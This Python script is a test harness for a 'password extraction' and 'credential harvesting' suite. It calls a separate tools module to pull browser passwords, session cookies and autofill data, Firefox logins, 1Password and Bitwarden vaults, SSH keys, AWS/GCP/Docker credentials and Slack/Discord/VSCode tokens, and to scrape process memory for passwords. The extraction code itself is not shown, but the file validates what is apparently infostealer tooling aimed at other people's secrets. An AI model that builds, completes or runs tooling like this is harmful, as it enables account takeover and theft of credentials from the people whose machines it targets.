#!/usr/bin/env python3
"""
Test script for password extraction functions
"""

import tools
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

console = Console()

def test_function(name, func, *args):
    """Test a single extraction function."""
    console.print(f"\n[bold cyan]Testing: {name}[/bold cyan]")
    console.print("=" * 70)
    
    try:
        result = func(*args) if args else func()
        
        # Color code based on result
        if "Error" in result or "error" in result:
            console.print(Panel(result, title=f"[red]FAIL {name}[/red]", border_style="red"))
        elif "not found" in result.lower() or "not installed" in result.lower():
            console.print(Panel(result, title=f"[yellow]SKIP {name}[/yellow]", border_style="yellow"))
        else:
            console.print(Panel(result, title=f"[green]PASS {name}[/green]", border_style="green"))
    except Exception as e:
        console.print(Panel(f"Exception: {str(e)}", title=f"[red]ERROR {name}[/red]", border_style="red"))

def main():
    console.clear()
    console.print(Panel.fit(
        "[bold yellow]PASSWORD EXTRACTION TEST SUITE[/bold yellow]\n"
        "Testing all credential harvesting functions\n"
        "[dim]Press Ctrl+C to stop[/dim]",
        border_style="yellow"
    ))
    
    # Test basic browser detection
    test_function("Browser Passwords (Basic Detection)", tools.extract_browser_passwords)

    console.print("\n[yellow]Note: Advanced extraction reads encrypted databases (no decryption = no passwords shown)[/yellow]")
    test_function("Chrome/Brave Login Database Analysis", tools.extract_chrome_passwords_advanced)
    test_function("Chrome/Brave Session Cookies", tools.extract_chrome_cookies)
    test_function("Chrome/Brave Autofill Data", tools.extract_chrome_autofill)
    
    # Test Firefox
    test_function("Firefox Passwords", tools.extract_firefox_passwords)
    
    # Test password managers
    test_function("1Password Vault Detection", tools.extract_1password_vault)
    test_function("Bitwarden Vault Detection", tools.extract_bitwarden_vault)
    
    # Test memory scraping
    test_function("Memory Scraping (Running Processes)", tools.memory_scrape_passwords)
    
    # Test other credential sources
    test_function("SSH Keys", tools.harvest_ssh_keys)

    console.print("\n[yellow]SKIP: macOS Keychain (would cause authorization popups)[/yellow]")
    
    test_function("Cloud Credentials (AWS/GCP/Docker)", tools.harvest_cloud_credentials)
    test_function("App Tokens (Slack/Discord/VSCode)", tools.extract_app_tokens)
    
    console.print("\n[bold green]Test suite completed![/bold green]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]Test interrupted[/yellow]")

